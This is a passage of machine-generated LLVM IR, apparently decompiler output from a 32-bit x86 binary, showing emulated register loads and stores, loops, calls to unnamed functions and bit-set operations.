  %v2_8048aa7 = add i32 %v0_8048a9b, 8
  %v3_8048aa7 = inttoptr i32 %v2_8048aa7 to i32*
  store i32 %v2_8048aa5, i32* %v3_8048aa7, align 4
  %v1_8048aa8 = add i32 %v0_8048a9b, 4
  %v2_8048aa8 = inttoptr i32 %v1_8048aa8 to i32*
  store i32 10, i32* %v2_8048aa8, align 4
  %v3_8048aaa = inttoptr i32 %v0_8048a9b to i32*
  store i32 %v2_8048a96, i32* %v3_8048aaa, align 4
  %v4_8048aab = call i32 @function_804f9c0(i64 %v3_8048aab, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048aab, i32* %eax.global-to-local, align 4
  %v0_8048ab0 = load i32, i32* @esp, align 4
  %v1_8048ab0 = inttoptr i32 %v0_8048ab0 to i32*
  %v2_8048ab0 = load i32, i32* %v1_8048ab0, align 4
  store i32 %v2_8048ab0, i32* @ebx, align 4
  %v1_8048ab1 = add i32 %v0_8048ab0, 10388
  store i32 %v1_8048ab1, i32* %eax.global-to-local, align 4
  store i32 %v1_8048ab1, i32* %v1_8048ab0, align 4
  %v2_8048ab9 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048ab9, i32* %eax.global-to-local, align 4
  %v0_8048abe = load i32, i32* @esp, align 4
  %v1_8048abe = inttoptr i32 %v0_8048abe to i32*
  %v2_8048abe = load i32, i32* %v1_8048abe, align 4
  store i32 %v2_8048abe, i32* %edx.global-to-local, align 4
  %v3_8048abe = add i32 %v0_8048abe, 4
  %v1_8048abf = inttoptr i32 %v3_8048abe to i32*
  %v2_8048abf = load i32, i32* %v1_8048abf, align 4
  store i32 %v2_8048abf, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_8048abf, align 4
  %v1_8048ac5 = add i32 %v0_8048abe, 10388
  store i32 %v1_8048ac5, i32* %edx.global-to-local, align 4
  %v2_8048acc = add i32 %v1_8048ac5, %v2_8048ab9
  store i32 %v2_8048acc, i32* %eax.global-to-local, align 4
  store i32 %v2_8048acc, i32* %v1_8048abe, align 4
  %v3_8048ad0 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048ad0, i32* %eax.global-to-local, align 4
  %v0_8048ad5 = load i32, i32* @esp, align 4
  %v1_8048ad5 = add i32 %v0_8048ad5, 16
  %v6_8048ad5 = icmp eq i32 %v1_8048ad5, 0
  store i1 %v6_8048ad5, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048ad8

dec_label_pc_8048ad8:                             ; preds = %dec_label_pc_8048700, %dec_label_pc_80489c4
  %v0_8048ae3 = phi i32 [ %v1_80489b5, %dec_label_pc_8048700 ], [ %v1_8048ad5, %dec_label_pc_80489c4 ]
  %v0_8048ad8 = load i32, i32* @esi, align 4
  %v1_8048ad8 = add i32 %v0_8048ad8, 28
  %v2_8048ad8 = inttoptr i32 %v1_8048ad8 to i32*
  %v3_8048ad8 = load i32, i32* %v2_8048ad8, align 4
  store i32 %v3_8048ad8, i32* @ebx, align 4
  %v1_8048adb = icmp eq i32 %v3_8048ad8, 0
  store i1 %v1_8048adb, i1* %zf.global-to-local, align 1
  %tmp139 = icmp slt i32 %v3_8048ad8, 1
  br i1 %tmp139, label %dec_label_pc_8048bb4, label %dec_label_pc_8048ae3

dec_label_pc_8048ae3:                             ; preds = %dec_label_pc_8048ad8
  %v9_8048ae3 = icmp eq i32 %v0_8048ae3, 12
  store i1 %v9_8048ae3, i1* %zf.global-to-local, align 1
  %v1_8048ae6 = add i32 %v0_8048ae3, 10372
  store i32 %v1_8048ae6, i32* %ecx.global-to-local, align 4
  %v2_8048aed = add i32 %v0_8048ae3, -16
  %v3_8048aed = inttoptr i32 %v2_8048aed to i32*
  store i32 %v1_8048ae6, i32* %v3_8048aed, align 4
  %v2_8048aee = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048aee, i32* %eax.global-to-local, align 4
  %v0_8048af3 = load i32, i32* @esp, align 4
  %v1_8048af3 = inttoptr i32 %v0_8048af3 to i32*
  %v2_8048af3 = load i32, i32* %v1_8048af3, align 4
  store i32 %v2_8048af3, i32* %edx.global-to-local, align 4
  %v3_8048af3 = add i32 %v0_8048af3, 4
  %v1_8048af4 = inttoptr i32 %v3_8048af3 to i32*
  %v2_8048af4 = load i32, i32* %v1_8048af4, align 4
  store i32 %v2_8048af4, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8052478.11 to i32), i32* %v1_8048af4, align 4
  %v1_8048afa = add i32 %v0_8048af3, 10388
  store i32 %v1_8048afa, i32* %edx.global-to-local, align 4
  %v2_8048b01 = add i32 %v1_8048afa, %v2_8048aee
  store i32 %v2_8048b01, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b01, i32* %v1_8048af3, align 4
  %v3_8048b05 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b05, i32* %eax.global-to-local, align 4
  %v0_8048b0a = load i32, i32* @esp, align 4
  %v1_8048b0a = add i32 %v0_8048b0a, 20916
  %v2_8048b0a = inttoptr i32 %v1_8048b0a to i32*
  store i32 0, i32* %v2_8048b0a, align 4
  %v0_8048b15 = load i32, i32* @esp, align 4
  %v1_8048b15 = add i32 %v0_8048b15, 16
  %v0_8048b18 = load i32, i32* @esi, align 4
  %v1_8048b18 = add i32 %v0_8048b18, 28
  %v2_8048b18 = inttoptr i32 %v1_8048b18 to i32*
  %v3_8048b18 = load i32, i32* %v2_8048b18, align 4
  store i32 %v3_8048b18, i32* %ebx.global-to-local, align 4
  %v1_8048b1b = icmp eq i32 %v3_8048b18, 0
  store i1 %v1_8048b1b, i1* %zf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v3_8048b18, 1
  br i1 %tmp140, label %dec_label_pc_8048b8a, label %dec_label_pc_8048b1f

dec_label_pc_8048b1f:                             ; preds = %dec_label_pc_8048ae3
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8048b21

dec_label_pc_8048b21:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048b1f
  %v0_8048b24 = phi i32 [ %v1_8048b82, %dec_label_pc_8048b21 ], [ %v1_8048b15, %dec_label_pc_8048b1f ]
  %v0_8048b21 = phi i32 [ %v4_8048b85, %dec_label_pc_8048b21 ], [ 0, %dec_label_pc_8048b1f ]
  %v2_8048b21 = mul i32 %v0_8048b21, 128
  store i32 %v2_8048b21, i32* @ebx, align 4
  %v9_8048b24 = icmp eq i32 %v0_8048b24, 12
  store i1 %v9_8048b24, i1* %zf.global-to-local, align 1
  %v1_8048b27 = add i32 %v0_8048b24, 10372
  store i32 %v1_8048b27, i32* %ecx.global-to-local, align 4
  %v2_8048b2e = add i32 %v0_8048b24, -16
  %v3_8048b2e = inttoptr i32 %v2_8048b2e to i32*
  store i32 %v1_8048b27, i32* %v3_8048b2e, align 4
  %v2_8048b2f = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048b2f, i32* %eax.global-to-local, align 4
  %v0_8048b34 = load i32, i32* @esp, align 4
  %v1_8048b34 = inttoptr i32 %v0_8048b34 to i32*
  %v3_8048b34 = add i32 %v0_8048b34, 4
  %v0_8048b35 = load i32, i32* @ebx, align 4
  %v1_8048b35 = load i32, i32* @edi, align 4
  %v2_8048b35 = add i32 %v0_8048b35, 1472
  %v3_8048b35 = add i32 %v2_8048b35, %v1_8048b35
  store i32 %v3_8048b35, i32* %edx.global-to-local, align 4
  %v1_8048b3c = inttoptr i32 %v3_8048b34 to i32*
  %v2_8048b3c = load i32, i32* %v1_8048b3c, align 4
  store i32 %v2_8048b3c, i32* %ecx.global-to-local, align 4
  store i32 %v3_8048b35, i32* %v1_8048b3c, align 4
  %v1_8048b3e = add i32 %v0_8048b34, 10388
  store i32 %v1_8048b3e, i32* %edx.global-to-local, align 4
  %v2_8048b45 = add i32 %v1_8048b3e, %v2_8048b2f
  store i32 %v2_8048b45, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b45, i32* %v1_8048b34, align 4
  %v3_8048b49 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b49, i32* %eax.global-to-local, align 4
  %v0_8048b4e = load i32, i32* @esp, align 4
  %v1_8048b4e = inttoptr i32 %v0_8048b4e to i32*
  %v2_8048b4e = load i32, i32* %v1_8048b4e, align 4
  store i32 %v2_8048b4e, i32* @ebx, align 4
  %v1_8048b4f = add i32 %v0_8048b4e, 10388
  store i32 %v1_8048b4f, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048b4f, i32* %v1_8048b4e, align 4
  %v2_8048b57 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048b57, i32* %eax.global-to-local, align 4
  %v0_8048b5c = load i32, i32* @esp, align 4
  %v1_8048b5c = inttoptr i32 %v0_8048b5c to i32*
  %v2_8048b5c = load i32, i32* %v1_8048b5c, align 4
  store i32 %v2_8048b5c, i32* %edx.global-to-local, align 4
  %v3_8048b5c = add i32 %v0_8048b5c, 4
  %v1_8048b5d = inttoptr i32 %v3_8048b5c to i32*
  %v2_8048b5d = load i32, i32* %v1_8048b5d, align 4
  store i32 %v2_8048b5d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052481.12 to i32), i32* %v1_8048b5d, align 4
  %v1_8048b63 = add i32 %v0_8048b5c, 10388
  store i32 %v1_8048b63, i32* %edx.global-to-local, align 4
  %v2_8048b6a = add i32 %v1_8048b63, %v2_8048b57
  store i32 %v2_8048b6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8048b6a, i32* %v1_8048b5c, align 4
  %v3_8048b6e = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048b6e, i32* %eax.global-to-local, align 4
  %v0_8048b73 = load i32, i32* @esp, align 4
  %v1_8048b73 = add i32 %v0_8048b73, 20916
  %v2_8048b73 = inttoptr i32 %v1_8048b73 to i32*
  %v3_8048b73 = load i32, i32* %v2_8048b73, align 4
  %v1_8048b7a = add i32 %v3_8048b73, 1
  store i32 %v1_8048b7a, i32* %ebx.global-to-local, align 4
  store i32 %v1_8048b7a, i32* %v2_8048b73, align 4
  %v0_8048b82 = load i32, i32* @esp, align 4
  %v1_8048b82 = add i32 %v0_8048b82, 16
  %v0_8048b85 = load i32, i32* @esi, align 4
  %v1_8048b85 = add i32 %v0_8048b85, 28
  %v2_8048b85 = inttoptr i32 %v1_8048b85 to i32*
  %v3_8048b85 = load i32, i32* %v2_8048b85, align 4
  %v4_8048b85 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8048b85 = sub i32 %v3_8048b85, %v4_8048b85
  %v11_8048b85 = xor i32 %v4_8048b85, %v3_8048b85
  %v12_8048b85 = xor i32 %v5_8048b85, %v3_8048b85
  %v13_8048b85 = and i32 %v12_8048b85, %v11_8048b85
  %v14_8048b85 = icmp slt i32 %v13_8048b85, 0
  %v15_8048b85 = icmp eq i32 %v5_8048b85, 0
  store i1 %v15_8048b85, i1* %zf.global-to-local, align 1
  %v16_8048b85 = icmp slt i32 %v5_8048b85, 0
  %v3_8048b88 = icmp eq i1 %v16_8048b85, %v14_8048b85
  %v4_8048b88 = icmp eq i1 %v15_8048b85, false
  %v5_8048b88 = and i1 %v4_8048b88, %v3_8048b88
  br i1 %v5_8048b88, label %dec_label_pc_8048b21, label %dec_label_pc_8048b8a

dec_label_pc_8048b8a:                             ; preds = %dec_label_pc_8048b21, %dec_label_pc_8048ae3
  %v0_8048b8a = phi i32 [ %v1_8048b15, %dec_label_pc_8048ae3 ], [ %v1_8048b82, %dec_label_pc_8048b21 ]
  %v9_8048b8a = icmp eq i32 %v0_8048b8a, 12
  store i1 %v9_8048b8a, i1* %zf.global-to-local, align 1
  %v1_8048b8d = add i32 %v0_8048b8a, 10372
  store i32 %v1_8048b8d, i32* %ecx.global-to-local, align 4
  %v2_8048b94 = add i32 %v0_8048b8a, -16
  %v3_8048b94 = inttoptr i32 %v2_8048b94 to i32*
  store i32 %v1_8048b8d, i32* %v3_8048b94, align 4
  %v2_8048b95 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048b95, i32* %eax.global-to-local, align 4
  %v0_8048b9a = load i32, i32* @esp, align 4
  %v1_8048b9a = inttoptr i32 %v0_8048b9a to i32*
  %v2_8048b9a = load i32, i32* %v1_8048b9a, align 4
  store i32 %v2_8048b9a, i32* @ebx, align 4
  %v3_8048b9a = add i32 %v0_8048b9a, 4
  %v1_8048b9b = inttoptr i32 %v3_8048b9a to i32*
  %v2_8048b9b = load i32, i32* %v1_8048b9b, align 4
  store i32 %v2_8048b9b, i32* %edi.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_8048b9b, align 4
  %v1_8048ba1 = add i32 %v0_8048b9a, 10388
  store i32 %v1_8048ba1, i32* %edx.global-to-local, align 4
  %v2_8048ba8 = add i32 %v1_8048ba1, %v2_8048b95
  store i32 %v2_8048ba8, i32* %eax.global-to-local, align 4
  store i32 %v2_8048ba8, i32* %v1_8048b9a, align 4
  %v3_8048bac = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bac, i32* %eax.global-to-local, align 4
  %v0_8048bb1 = load i32, i32* @esp, align 4
  %v1_8048bb1 = add i32 %v0_8048bb1, 16
  %v6_8048bb1 = icmp eq i32 %v1_8048bb1, 0
  store i1 %v6_8048bb1, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048bb4

dec_label_pc_8048bb4:                             ; preds = %dec_label_pc_8048ad8, %dec_label_pc_8048b8a
  %v0_8048bb4 = phi i32 [ %v0_8048ae3, %dec_label_pc_8048ad8 ], [ %v1_8048bb1, %dec_label_pc_8048b8a ]
  %v9_8048bb4 = icmp eq i32 %v0_8048bb4, 12
  store i1 %v9_8048bb4, i1* %zf.global-to-local, align 1
  %v1_8048bb7 = add i32 %v0_8048bb4, 10372
  store i32 %v1_8048bb7, i32* %ecx.global-to-local, align 4
  %v2_8048bbe = add i32 %v0_8048bb4, -16
  %v3_8048bbe = inttoptr i32 %v2_8048bbe to i32*
  store i32 %v1_8048bb7, i32* %v3_8048bbe, align 4
  %v2_8048bbf = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048bbf, i32* %eax.global-to-local, align 4
  %v0_8048bc4 = load i32, i32* @esp, align 4
  %v1_8048bc4 = inttoptr i32 %v0_8048bc4 to i32*
  %v2_8048bc4 = load i32, i32* %v1_8048bc4, align 4
  store i32 %v2_8048bc4, i32* %edx.global-to-local, align 4
  %v3_8048bc4 = add i32 %v0_8048bc4, 4
  %v1_8048bc5 = inttoptr i32 %v3_8048bc4 to i32*
  %v2_8048bc5 = load i32, i32* %v1_8048bc5, align 4
  store i32 %v2_8048bc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v1_8048bc5, align 4
  %v1_8048bcb = add i32 %v0_8048bc4, 10388
  store i32 %v1_8048bcb, i32* %edx.global-to-local, align 4
  %v2_8048bd2 = add i32 %v1_8048bcb, %v2_8048bbf
  store i32 %v2_8048bd2, i32* %eax.global-to-local, align 4
  store i32 %v2_8048bd2, i32* %v1_8048bc4, align 4
  %v3_8048bd6 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048bd6, i32* %eax.global-to-local, align 4
  %v0_8048bdb = load i32, i32* @esp, align 4
  %v1_8048bdb = add i32 %v0_8048bdb, 16
  %v1_8048bde = add i32 %v0_8048bdb, 68
  %v2_8048bde = inttoptr i32 %v1_8048bde to i32*
  %v3_8048bde = load i32, i32* %v2_8048bde, align 4
  store i32 %v3_8048bde, i32* @edi, align 4
  %v1_8048be2 = icmp eq i32 %v3_8048bde, 0
  store i1 %v1_8048be2, i1* %zf.global-to-local, align 1
  br i1 %v1_8048be2, label %dec_label_pc_8048c10, label %dec_label_pc_8048be6

dec_label_pc_8048be6:                             ; preds = %dec_label_pc_8048bb4
  %v9_8048be6 = icmp eq i32 %v0_8048bdb, -4
  store i1 %v9_8048be6, i1* %zf.global-to-local, align 1
  %v1_8048be9 = add i32 %v0_8048bdb, 10388
  store i32 %v1_8048be9, i32* %ecx.global-to-local, align 4
  %v3_8048bf0 = inttoptr i32 %v0_8048bdb to i32*
  store i32 %v1_8048be9, i32* %v3_8048bf0, align 4
  %v2_8048bf1 = call i32 @function_804f5b0(i8* %v1_8048752)
  store i32 %v2_8048bf1, i32* %eax.global-to-local, align 4
  %v0_8048bf6 = load i32, i32* @esp, align 4
  %v1_8048bf6 = inttoptr i32 %v0_8048bf6 to i32*
  %v2_8048bf6 = load i32, i32* %v1_8048bf6, align 4
  store i32 %v2_8048bf6, i32* %ecx.global-to-local, align 4
  %v3_8048bf6 = add i32 %v0_8048bf6, 4
  %v1_8048bf7 = inttoptr i32 %v3_8048bf6 to i32*
  %v2_8048bf7 = load i32, i32* %v1_8048bf7, align 4
  store i32 %v2_8048bf7, i32* @ebx, align 4
  %v1_8048bf8 = add i32 %v0_8048bf6, 68
  %v2_8048bf8 = inttoptr i32 %v1_8048bf8 to i32*
  %v3_8048bf8 = load i32, i32* %v2_8048bf8, align 4
  store i32 %v3_8048bf8, i32* %v1_8048bf7, align 4
  %v1_8048bfd = add i32 %v0_8048bf6, 10388
  store i32 %v1_8048bfd, i32* %edx.global-to-local, align 4
  %v2_8048c04 = add i32 %v1_8048bfd, %v2_8048bf1
  store i32 %v2_8048c04, i32* %eax.global-to-local, align 4
  store i32 %v2_8048c04, i32* %v1_8048bf6, align 4
  %v3_8048c08 = call i32 @function_804f5d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048c08, i32* %eax.global-to-local, align 4
  %v0_8048c0d = load i32, i32* @esp, align 4
  %v1_8048c0d = add i32 %v0_8048c0d, 16
  %v6_8048c0d = icmp eq i32 %v1_8048c0d, 0
  store i1 %v6_8048c0d, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048c10

dec_label_pc_8048c10:                             ; preds = %dec_label_pc_8048bb4, %dec_label_pc_8048be6
  %v1_8048c10 = phi i32 [ %v1_8048bdb, %dec_label_pc_8048bb4 ], [ %v1_8048c0d, %dec_label_pc_8048be6 ]
  %v0_8048c10 = phi i32 [ %v3_8048bd6, %dec_label_pc_8048bb4 ], [ %v3_8048c08, %dec_label_pc_8048be6 ]
  %v2_8048c10 = add i32 %v1_8048c10, -4
  %v3_8048c10 = inttoptr i32 %v2_8048c10 to i32*
  store i32 %v0_8048c10, i32* %v3_8048c10, align 4
  %v0_8048c11 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048c11 = add i32 %v1_8048c10, -8
  %v3_8048c11 = inttoptr i32 %v2_8048c11 to i32*
  store i32 %v0_8048c11, i32* %v3_8048c11, align 4
  %v0_8048c12 = load i32, i32* @esi, align 4
  %v2_8048c12 = add i32 %v1_8048c10, -12
  %v3_8048c12 = inttoptr i32 %v2_8048c12 to i32*
  store i32 %v0_8048c12, i32* %v3_8048c12, align 4
  %v1_8048c13 = add i32 %v1_8048c10, 96
  %v2_8048c13 = inttoptr i32 %v1_8048c13 to i32*
  %v3_8048c13 = load i32, i32* %v2_8048c13, align 4
  store i32 %v3_8048c13, i32* %eax.global-to-local, align 4
  %v2_8048c17 = add i32 %v1_8048c10, -16
  %v3_8048c17 = inttoptr i32 %v2_8048c17 to i32*
  store i32 %v3_8048c13, i32* %v3_8048c17, align 4
  %v0_8048c18 = call i32 @function_804f920()
  store i32 %v0_8048c18, i32* %eax.global-to-local, align 4
  %v0_8048c1d = load i32, i32* @esp, align 4
  %v1_8048c1d = add i32 %v0_8048c1d, 16
  %v3_8048c20 = trunc i32 %v0_8048c18 to i8
  %v4_8048c20 = icmp eq i8 %v3_8048c20, 0
  store i1 %v4_8048c20, i1* %zf.global-to-local, align 1
  br i1 %v4_8048c20, label %dec_label_pc_804979e, label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c10, %dec_label_pc_804979e
  %v0_8048c28 = phi i32 [ %v1_8048c1d, %dec_label_pc_8048c10 ], [ %v1_80497ab, %dec_label_pc_804979e ]
  %v9_8048c28 = icmp eq i32 %v0_8048c28, 12
  store i1 %v9_8048c28, i1* %zf.global-to-local, align 1
  %v1_8048c2b = add i32 %v0_8048c28, 10372
  store i32 %v1_8048c2b, i32* %ecx.global-to-local, align 4
  %v2_8048c32 = add i32 %v0_8048c28, -16
  %v3_8048c32 = inttoptr i32 %v2_8048c32 to i32*
  store i32 %v1_8048c2b, i32* %v3_8048c32, align 4
  %v2_8048c33 = call i32 @function_804f5b0(i8* %v1_8048752)
  %v0_8048c38 = load i32, i32* @esp, align 4
  %v1_8048c38 = add i32 %v0_8048c38, -4
  %v2_8048c38 = inttoptr i32 %v1_8048c38 to i32*
  store i32 16384, i32* %v2_8048c38, align 4
  %v2_8048c3d = add i32 %v0_8048c38, -8
  %v3_8048c3d = inttoptr i32 %v2_8048c3d to i32*
  store i32 %v2_8048c33, i32* %v3_8048c3d, align 4
  %v1_8048c3e = add i32 %v0_8048c38, 10388
  store i32 %v1_8048c3e, i32* %eax.global-to-local, align 4
  %v2_8048c45 = add i32 %v0_8048c38, -12
  %v3_8048c45 = inttoptr i32 %v2_8048c45 to i32*
  store i32 %v1_8048c3e, i32* %v3_8048c45, align 4
  %v0_8048c46 = load i32, i32* @esi, align 4
  %v1_8048c46 = add i32 %v0_8048c46, -1440
  %v2_8048c46 = inttoptr i32 %v1_8048c46 to i32*
  %v3_8048c46 = load i32, i32* %v2_8048c46, align 4
  store i32 %v3_8048c46, i32* %ecx.global-to-local, align 4
  %v2_8048c4c = add i32 %v0_8048c38, -16
  %v3_8048c4c = inttoptr i32 %v2_8048c4c to i32*
  store i32 %v3_8048c46, i32* %v3_8048c4c, align 4
  %v0_8048c4d = call i32 @function_8050294()
  store i32 %v0_8048c4d, i32* %eax.global-to-local, align 4
  %v0_8048c52 = load i32, i32* @esp, align 4
  %v1_8048c52 = add i32 %v0_8048c52, 112
  %v2_8048c52 = inttoptr i32 %v1_8048c52 to i32*
  %v3_8048c52 = load i32, i32* %v2_8048c52, align 4
  store i32 %v3_8048c52, i32* %edx.global-to-local, align 4
  %v0_8048c56 = load i32, i32* @esi, align 4
  %v1_8048c56 = add i32 %v0_8048c56, -1440
  %v2_8048c56 = inttoptr i32 %v1_8048c56 to i32*
  %v3_8048c56 = load i32, i32* %v2_8048c56, align 4
  store i32 %v3_8048c56, i32* %eax.global-to-local, align 4
  %v2_8048c5c = add i32 %v0_8048c56, -1428
  %v3_8048c5c = inttoptr i32 %v2_8048c5c to i32*
  store i32 %v3_8048c52, i32* %v3_8048c5c, align 4
  %v0_8048c62 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8048c62, i32* %edx.global-to-local, align 4
  %v0_8048c64 = load i32, i32* @esi, align 4
  %v1_8048c64 = add i32 %v0_8048c64, -1436
  %v2_8048c64 = inttoptr i32 %v1_8048c64 to i8*
  store i8 6, i8* %v2_8048c64, align 1
  %v0_8048c6b = load i32, i32* %eax.global-to-local, align 4
  %v1_8048c6b = urem i32 %v0_8048c6b, 32
  store i32 %v1_8048c6b, i32* %eax.global-to-local, align 4
  %v0_8048c6e = load i32, i32* %edx.global-to-local, align 4
  %v2_8048c6e = udiv i32 %v0_8048c6e, 32
  store i32 %v2_8048c6e, i32* %edx.global-to-local, align 4
  %v0_8048c71 = load i32, i32* @esp, align 4
  %v2_8048c71 = mul nuw nsw i32 %v2_8048c6e, 4
  %v3_8048c71 = add nuw nsw i32 %v2_8048c71, 20772
  %v4_8048c71 = add i32 %v3_8048c71, %v0_8048c71
  %v5_8048c71 = inttoptr i32 %v4_8048c71 to i32*
  %v6_8048c71 = load i32, i32* %v5_8048c71, align 4
  %v9_8048c71 = shl i32 1, %v1_8048c6b
  %v12_8048c71 = or i32 %v6_8048c71, %v9_8048c71
  %v16_8048c71 = add i32 %v0_8048c71, 20772
  %v17_8048c71 = add i32 %v16_8048c71, %v2_8048c71
  %v18_8048c71 = inttoptr i32 %v17_8048c71 to i32*
  store i32 %v12_8048c71, i32* %v18_8048c71, align 4
  %v0_8048c79 = load i32, i32* @esp, align 4
  %v1_8048c79 = add i32 %v0_8048c79, 32
  %v0_8048c7c = load i32, i32* @esi, align 4
  %v1_8048c7c = add i32 %v0_8048c7c, -1440
  %v2_8048c7c = inttoptr i32 %v1_8048c7c to i32*
  %v3_8048c7c = load i32, i32* %v2_8048c7c, align 4
  store i32 %v3_8048c7c, i32* %eax.global-to-local, align 4
  %v1_8048c82 = add i32 %v0_8048c79, 104
  %v2_8048c82 = inttoptr i32 %v1_8048c82 to i32*
  %v3_8048c82 = load i32, i32* %v2_8048c82, align 4
  %v5_8048c82 = sub i32 %v3_8048c82, %v3_8048c7c
  %v11_8048c82 = xor i32 %v3_8048c82, %v3_8048c7c
  %v12_8048c82 = xor i32 %v5_8048c82, %v3_8048c82
  %v13_8048c82 = and i32 %v12_8048c82, %v11_8048c82
  %v14_8048c82 = icmp slt i32 %v13_8048c82, 0
  %v15_8048c82 = icmp eq i32 %v5_8048c82, 0
  store i1 %v15_8048c82, i1* %zf.global-to-local, align 1
  %v16_8048c82 = icmp slt i32 %v5_8048c82, 0
  %v2_8048c86 = icmp eq i1 %v16_8048c82, %v14_8048c82
  br i1 %v2_8048c86, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048c91:                             ; preds = %dec_label_pc_80486ee
  store i8 0, i8* %v2_80485a5, align 1
  br label %dec_label_pc_80485be

dec_label_pc_8048c9d:                             ; preds = %dec_label_pc_8048537
  %v0_8048c9d = load i32, i32* @esp, align 4
  %v1_8048c9d = add i32 %v0_8048c9d, 80
  %v2_8048c9d = inttoptr i32 %v1_8048c9d to i32*
  %v3_8048c9d = load i32, i32* %v2_8048c9d, align 4
  store i32 %v3_8048c9d, i32* %eax.global-to-local, align 4
  %v1_8048ca1 = add i32 %v0_80485a5, -1432
  %v2_8048ca1 = inttoptr i32 %v1_8048ca1 to i32*
  %v3_8048ca1 = load i32, i32* %v2_8048ca1, align 4
  store i32 %v3_8048ca1, i32* @ebx, align 4
  %v2_8048ca7 = sub i32 %v3_8048c9d, %v3_8048ca1
  store i32 %v2_8048ca7, i32* %eax.global-to-local, align 4
  %v9_8048ca9 = icmp eq i32 %v2_8048ca7, 30
  store i1 %v9_8048ca9, i1* %zf.global-to-local, align 1
  %tmp239 = icmp ult i32 %v2_8048ca7, 31
  br i1 %tmp239, label %dec_label_pc_8048cb2, label %dec_label_pc_804855f

dec_label_pc_8048cb2:                             ; preds = %dec_label_pc_8048c9d
  %v1_8048cb2 = add i32 %v0_80485a5, -1440
  %v2_8048cb2 = inttoptr i32 %v1_8048cb2 to i32*
  %v3_8048cb2 = load i32, i32* %v2_8048cb2, align 4
  %v1_8048cba = urem i32 %v3_8048cb2, 32
  store i32 %v1_8048cba, i32* %eax.global-to-local, align 4
  %v2_8048cbd = udiv i32 %v3_8048cb2, 32
  store i32 %v2_8048cbd, i32* %edx.global-to-local, align 4
  %v2_8048cc0 = mul nuw nsw i32 %v2_8048cbd, 4
  %v3_8048cc0 = add i32 %v0_8048c9d, 20612
  %v4_8048cc0 = add i32 %v3_8048cc0, %v2_8048cc0
  %v5_8048cc0 = inttoptr i32 %v4_8048cc0 to i32*
  %v6_8048cc0 = load i32, i32* %v5_8048cc0, align 4
  %v9_8048cc0 = shl i32 1, %v1_8048cba
  %v12_8048cc0 = or i32 %v6_8048cc0, %v9_8048cc0
  store i32 %v12_8048cc0, i32* %v5_8048cc0, align 4
  %v0_8048cc8 = load i32, i32* @esi, align 4
  %v1_8048cc8 = add i32 %v0_8048cc8, -1440
  %v2_8048cc8 = inttoptr i32 %v1_8048cc8 to i32*
  %v3_8048cc8 = load i32, i32* %v2_8048cc8, align 4
  store i32 %v3_8048cc8, i32* %eax.global-to-local, align 4
  %v0_8048cce = load i32, i32* @esp, align 4
  %v1_8048cce = add i32 %v0_8048cce, 72
  %v2_8048cce = inttoptr i32 %v1_8048cce to i32*
  %v3_8048cce = load i32, i32* %v2_8048cce, align 4
  %v5_8048cce = sub i32 %v3_8048cce, %v3_8048cc8
  %v11_8048cce = xor i32 %v3_8048cce, %v3_8048cc8
  %v12_8048cce = xor i32 %v5_8048cce, %v3_8048cce
  %v13_8048cce = and i32 %v12_8048cce, %v11_8048cce
  %v14_8048cce = icmp slt i32 %v13_8048cce, 0
  %v15_8048cce = icmp eq i32 %v5_8048cce, 0
  store i1 %v15_8048cce, i1* %zf.global-to-local, align 1
  %v16_8048cce = icmp slt i32 %v5_8048cce, 0
  %v2_8048cd2 = icmp eq i1 %v16_8048cce, %v14_8048cce
  br i1 %v2_8048cd2, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_8048cdd:                             ; preds = %dec_label_pc_8048582
  %v1_8048cdd = add i32 %v0_8048597, 72
  %v2_8048cdd = inttoptr i32 %v1_8048cdd to i32*
  %v3_8048cdd = load i32, i32* %v2_8048cdd, align 4
  store i32 %v3_8048cdd, i32* %eax.global-to-local, align 4
  %v1_8048ce1 = icmp eq i32 %v3_8048cdd, 0
  store i1 %v1_8048ce1, i1* %zf.global-to-local, align 1
